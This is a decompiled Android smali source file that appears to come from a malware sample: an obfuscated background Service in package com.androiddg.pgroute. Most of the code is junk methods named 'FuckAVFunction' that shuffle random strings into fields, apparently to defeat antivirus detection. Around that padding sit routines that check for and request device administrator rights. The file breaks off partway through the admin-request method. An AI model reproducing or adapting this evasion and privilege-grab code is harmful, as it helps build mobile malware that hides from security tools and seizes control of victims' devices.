.class public Lcom/androiddg/pgroute/oRwHoDwR;
.super Landroid/app/Service;
.source "oRwHoDwR.java"


# static fields
.field public static isRunning:Z

.field private static p0:Ljava/lang/String;

.field private static p1:Ljava/lang/String;

.field private static p10:Ljava/lang/String;

.field private static p11:Ljava/lang/String;

.field private static p12:Ljava/lang/String;

.field private static p13:Ljava/lang/String;

.field private static p14:Ljava/lang/String;

.field private static p15:Ljava/lang/Integer;

.field private static p16:Ljava/lang/String;

.field private static p17:Ljava/lang/Boolean;

.field private static p18:Ljava/lang/Boolean;

.field private static p19:Ljava/lang/String;

.field private static p2:Ljava/lang/String;

.field private static p3:Ljava/lang/Integer;

.field private static p4:Ljava/lang/String;

.field private static p5:Ljava/lang/Integer;

.field private static p6:Ljava/lang/Integer;

.field private static p7:Ljava/lang/String;

.field private static p8:Ljava/lang/Integer;

.field private static p9:Ljava/lang/Integer;


# instance fields
.field private context:Landroid/content/Context;

.field private deviceManager:Landroid/app/admin/DevicePolicyManager;

.field private settings:Landroid/content/SharedPreferences;

.field private wakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 44
    const/4 v0, 0x0

    sput-boolean v0, Lcom/androiddg/pgroute/oRwHoDwR;->isRunning:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 22
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private static FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/String;

    .prologue
    .line 58
    move-object v1, p1

    .line 59
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/oRwHoDwR;->p11:Ljava/lang/String;

    .line 60
    move-object v2, p2

    .line 61
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/oRwHoDwR;->p16:Ljava/lang/String;

    .line 62
    move-object v3, p3

    .line 63
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/oRwHoDwR;->p13:Ljava/lang/String;

    .line 64
    move-object v5, p5

    .line 65
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/oRwHoDwR;->p7:Ljava/lang/String;

    .line 66
    move-object v4, p4

    .line 67
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/oRwHoDwR;->p14:Ljava/lang/String;

    .line 68
    move-object v0, p0

    .line 69
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androiddg/pgroute/oRwHoDwR;->p18:Ljava/lang/Boolean;

    .line 70
    return-object v5
.end method

.method private static FuckAVFunction1(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/String;
    .param p6, "v6"    # Ljava/lang/String;

    .prologue
    .line 73
    move-object v2, p2

    .line 74
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androiddg/pgroute/oRwHoDwR;->p15:Ljava/lang/Integer;

    .line 75
    move-object v6, p6

    .line 76
    .local v6, "s6":Ljava/lang/String;
    sput-object v6, Lcom/androiddg/pgroute/oRwHoDwR;->p16:Ljava/lang/String;

    .line 77
    move-object v3, p3

    .line 78
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/oRwHoDwR;->p12:Ljava/lang/String;

    .line 79
    move-object v4, p4

    .line 80
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/oRwHoDwR;->p13:Ljava/lang/String;

    .line 81
    move-object v5, p5

    .line 82
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/oRwHoDwR;->p7:Ljava/lang/String;

    .line 83
    move-object v1, p1

    .line 84
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/oRwHoDwR;->p10:Ljava/lang/String;

    .line 85
    move-object v0, p0

    .line 86
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/oRwHoDwR;->p1:Ljava/lang/String;

    .line 87
    return-object v6
.end method

.method private static FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;

    .prologue
    .line 90
    move-object v2, p2

    .line 91
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/oRwHoDwR;->p12:Ljava/lang/String;

    .line 92
    move-object v0, p0

    .line 93
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/oRwHoDwR;->p10:Ljava/lang/String;

    .line 94
    move-object v1, p1

    .line 95
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/oRwHoDwR;->p11:Ljava/lang/String;

    .line 97
    return-void
.end method

.method private static FuckAVFunction3(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 6
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/Integer;

    .prologue
    .line 99
    move-object v3, p3

    .line 100
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androiddg/pgroute/oRwHoDwR;->p17:Ljava/lang/Boolean;

    .line 101
    move-object v1, p1

    .line 102
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/oRwHoDwR;->p11:Ljava/lang/String;

    .line 103
    move-object v4, p4

    .line 104
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/oRwHoDwR;->p14:Ljava/lang/String;

    .line 105
    move-object v2, p2

    .line 106
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/oRwHoDwR;->p16:Ljava/lang/String;

    .line 107
    move-object v5, p5

    .line 108
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/oRwHoDwR;->p15:Ljava/lang/Integer;

    .line 109
    move-object v0, p0

    .line 110
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/oRwHoDwR;->p2:Ljava/lang/String;

    .line 111
    return-object v5
.end method

.method private static FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 6
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Integer;
    .param p5, "v5"    # Ljava/lang/Integer;

    .prologue
    .line 114
    move-object v4, p4

    .line 115
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androiddg/pgroute/oRwHoDwR;->p5:Ljava/lang/Integer;

    .line 116
    move-object v1, p1

    .line 117
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androiddg/pgroute/oRwHoDwR;->p18:Ljava/lang/Boolean;

    .line 118
    move-object v2, p2

    .line 119
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/oRwHoDwR;->p7:Ljava/lang/String;

    .line 120
    move-object v0, p0

    .line 121
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/oRwHoDwR;->p1:Ljava/lang/String;

    .line 122
    move-object v5, p5

    .line 123
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/oRwHoDwR;->p15:Ljava/lang/Integer;

    .line 124
    move-object v3, p3

    .line 125
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/oRwHoDwR;->p4:Ljava/lang/String;

    .line 126
    return-object v5
.end method

.method private static FuckAVFunction5(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/String;

    .prologue
    .line 129
    move-object v3, p3

    .line 130
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/oRwHoDwR;->p0:Ljava/lang/String;

    .line 131
    move-object v2, p2

    .line 132
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/oRwHoDwR;->p11:Ljava/lang/String;

    .line 133
    move-object v5, p5

    .line 134
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/oRwHoDwR;->p7:Ljava/lang/String;

    .line 135
    move-object v4, p4

    .line 136
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/oRwHoDwR;->p1:Ljava/lang/String;

    .line 137
    move-object v1, p1

    .line 138
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/oRwHoDwR;->p14:Ljava/lang/String;

    .line 139
    move-object v0, p0

    .line 140
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androiddg/pgroute/oRwHoDwR;->p5:Ljava/lang/Integer;

    .line 141
    return-object v5
.end method

.method private static FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 6
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/Integer;

    .prologue
    .line 144
    move-object v1, p1

    .line 145
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androiddg/pgroute/oRwHoDwR;->p18:Ljava/lang/Boolean;

    .line 146
    move-object v4, p4

    .line 147
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/oRwHoDwR;->p13:Ljava/lang/String;

    .line 148
    move-object v2, p2

    .line 149
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androiddg/pgroute/oRwHoDwR;->p15:Ljava/lang/Integer;

    .line 150
    move-object v5, p5

    .line 151
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/oRwHoDwR;->p6:Ljava/lang/Integer;

    .line 152
    move-object v0, p0

    .line 153
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/oRwHoDwR;->p1:Ljava/lang/String;

    .line 154
    move-object v3, p3

    .line 155
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/oRwHoDwR;->p0:Ljava/lang/String;

    .line 156
    return-object v5
.end method

.method private static FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/Integer;
    .param p6, "v6"    # Ljava/lang/String;

    .prologue
    .line 159
    move-object v3, p3

    .line 160
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androiddg/pgroute/oRwHoDwR;->p3:Ljava/lang/Integer;

    .line 161
    move-object v2, p2

    .line 162
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androiddg/pgroute/oRwHoDwR;->p6:Ljava/lang/Integer;

    .line 163
    move-object v6, p6

    .line 164
    .local v6, "s6":Ljava/lang/String;
    sput-object v6, Lcom/androiddg/pgroute/oRwHoDwR;->p2:Ljava/lang/String;

    .line 165
    move-object v0, p0

    .line 166
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/oRwHoDwR;->p0:Ljava/lang/String;

    .line 167
    move-object v5, p5

    .line 168
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/oRwHoDwR;->p9:Ljava/lang/Integer;

    .line 169
    move-object v1, p1

    .line 170
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androiddg/pgroute/oRwHoDwR;->p17:Ljava/lang/Boolean;

    .line 171
    move-object v4, p4

    .line 172
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/oRwHoDwR;->p4:Ljava/lang/String;

    .line 173
    return-object v6
.end method

.method private static FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 3
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Boolean;

    .prologue
    .line 176
    move-object v2, p2

    .line 177
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androiddg/pgroute/oRwHoDwR;->p18:Ljava/lang/Boolean;

    .line 178
    move-object v1, p1

    .line 179
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/oRwHoDwR;->p1:Ljava/lang/String;

    .line 180
    move-object v0, p0

    .line 181
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/oRwHoDwR;->p12:Ljava/lang/String;

    .line 182
    return-object v2
.end method

.method static synthetic access$000(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 1
    .param p0, "x0"    # Ljava/lang/String;
    .param p1, "x1"    # Ljava/lang/Boolean;
    .param p2, "x2"    # Ljava/lang/Integer;
    .param p3, "x3"    # Ljava/lang/String;
    .param p4, "x4"    # Ljava/lang/String;
    .param p5, "x5"    # Ljava/lang/Integer;

    .prologue
    .line 22
    invoke-static/range {p0 .. p5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$100(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 1
    .param p0, "x0"    # Ljava/lang/String;
    .param p1, "x1"    # Ljava/lang/String;
    .param p2, "x2"    # Ljava/lang/Boolean;

    .prologue
    .line 22
    invoke-static {p0, p1, p2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$1000(Lcom/androiddg/pgroute/oRwHoDwR;)Landroid/content/Context;
    .locals 1
    .param p0, "x0"    # Lcom/androiddg/pgroute/oRwHoDwR;

    .prologue
    .line 22
    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR;->context:Landroid/content/Context;

    return-object v0
.end method

.method static synthetic access$1100(Lcom/androiddg/pgroute/oRwHoDwR;)V
    .locals 0
    .param p0, "x0"    # Lcom/androiddg/pgroute/oRwHoDwR;

    .prologue
    .line 22
    invoke-direct {p0}, Lcom/androiddg/pgroute/oRwHoDwR;->requestDeviceAdmin()V

    return-void
.end method

.method static synthetic access$200(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .param p0, "x0"    # Ljava/lang/Integer;
    .param p1, "x1"    # Ljava/lang/String;
    .param p2, "x2"    # Ljava/lang/String;
    .param p3, "x3"    # Ljava/lang/String;
    .param p4, "x4"    # Ljava/lang/String;
    .param p5, "x5"    # Ljava/lang/String;

    .prologue
    .line 22
    invoke-static/range {p0 .. p5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction5(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$300(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .param p0, "x0"    # Ljava/lang/String;
    .param p1, "x1"    # Ljava/lang/String;
    .param p2, "x2"    # Ljava/lang/Integer;
    .param p3, "x3"    # Ljava/lang/String;
    .param p4, "x4"    # Ljava/lang/String;
    .param p5, "x5"    # Ljava/lang/String;
    .param p6, "x6"    # Ljava/lang/String;

    .prologue
    .line 22
    invoke-static/range {p0 .. p6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$400(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 1
    .param p0, "x0"    # Ljava/lang/String;
    .param p1, "x1"    # Ljava/lang/Boolean;
    .param p2, "x2"    # Ljava/lang/String;
    .param p3, "x3"    # Ljava/lang/String;
    .param p4, "x4"    # Ljava/lang/Integer;
    .param p5, "x5"    # Ljava/lang/Integer;

    .prologue
    .line 22
    invoke-static/range {p0 .. p5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$500(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .param p0, "x0"    # Ljava/lang/Boolean;
    .param p1, "x1"    # Ljava/lang/String;
    .param p2, "x2"    # Ljava/lang/String;
    .param p3, "x3"    # Ljava/lang/String;
    .param p4, "x4"    # Ljava/lang/String;
    .param p5, "x5"    # Ljava/lang/String;

    .prologue
    .line 22
    invoke-static/range {p0 .. p5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$600(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 1
    .param p0, "x0"    # Ljava/lang/String;
    .param p1, "x1"    # Ljava/lang/String;
    .param p2, "x2"    # Ljava/lang/String;
    .param p3, "x3"    # Ljava/lang/Boolean;
    .param p4, "x4"    # Ljava/lang/String;
    .param p5, "x5"    # Ljava/lang/Integer;

    .prologue
    .line 22
    invoke-static/range {p0 .. p5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction3(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v0

    return-object v0
.end method

.method static synthetic access$700(Lcom/androiddg/pgroute/oRwHoDwR;)Z
    .locals 1
    .param p0, "x0"    # Lcom/androiddg/pgroute/oRwHoDwR;

    .prologue
    .line 22
    invoke-direct {p0}, Lcom/androiddg/pgroute/oRwHoDwR;->hasDeviceAdmin()Z

    move-result v0

    return v0
.end method

.method static synthetic access$800(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p0, "x0"    # Ljava/lang/String;
    .param p1, "x1"    # Ljava/lang/String;
    .param p2, "x2"    # Ljava/lang/String;

    .prologue
    .line 22
    invoke-static {p0, p1, p2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$900(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .param p0, "x0"    # Ljava/lang/String;
    .param p1, "x1"    # Ljava/lang/Boolean;
    .param p2, "x2"    # Ljava/lang/Integer;
    .param p3, "x3"    # Ljava/lang/Integer;
    .param p4, "x4"    # Ljava/lang/String;
    .param p5, "x5"    # Ljava/lang/Integer;
    .param p6, "x6"    # Ljava/lang/String;

    .prologue
    .line 22
    invoke-static/range {p0 .. p6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private hasDeviceAdmin()Z
    .locals 10

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 396
    const-string v0, "hpOfSSjftWIE"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "AhvArjW"

    const-string v3, "VPJuma"

    const v4, 0xe6be0db

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x341192da

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 397
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "PTsaDPsas"

    const-string v2, "EGrprElp"

    const-string v3, "JwFHLeVD"

    const-string v4, "AnfWjhIE"

    const-string v5, "LumRoHo"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 398
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "kkPDeceJ"

    const-string v2, "hhpdQ"

    const-string v3, "PuiDgkHmi"

    const-string v4, "QGWQdW"

    const-string v5, "wBTcDaq"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 399
    const-string v0, "Opddf"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x8659fa3

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x24262594

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "dbOjQvr"

    const v5, 0x2d334113

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "IpUlvj"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 400
    new-instance v7, Landroid/content/ComponentName;

    const-class v0, Lcom/androiddg/pgroute/ltnEd;

    invoke-direct {v7, p0, v0}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 401
    .local v7, "componentName":Landroid/content/ComponentName;
    const-string v0, "awsNJNmu"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x11c703cb

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "AKOEO"

    const-string v4, "THPBDR"

    const v5, 0x239553dd

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 402
    const-string v0, "eiJucoqTV"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x898572

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "CMKQrO"

    const-string v4, "JBgqNc"

    const v5, 0x19d56875

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 403
    const-string v0, "ooHTwBF"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x260c40a

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "jCGnjn"

    const-string v4, "JuBqooqie"

    const v5, 0x25c32f2a

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 404
    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR;->deviceManager:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v0, v7}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    return v0
.end method

.method private requestDeviceAdmin()V
    .locals 10

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 353
    const-string v0, "JDmJk"

    const-string v1, "MMUSErvS"

    const v2, 0x19723922

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "lnMSU"

    const-string v4, "mauFaN"

    const-string v5, "hOfrAr"

    const-string v6, "wmDekFwN"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 354
    const-string v0, "ECfGlKthQd"

    const-string v1, "cDTgqeggBN"

    const-string v2, "ltnEd"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 355
    const-string v0, "NJqTce"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x3b3b5457

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "ECCrr"

    const-string v4, "oRwHoDwR"

    const v5, 0x17b2ba27

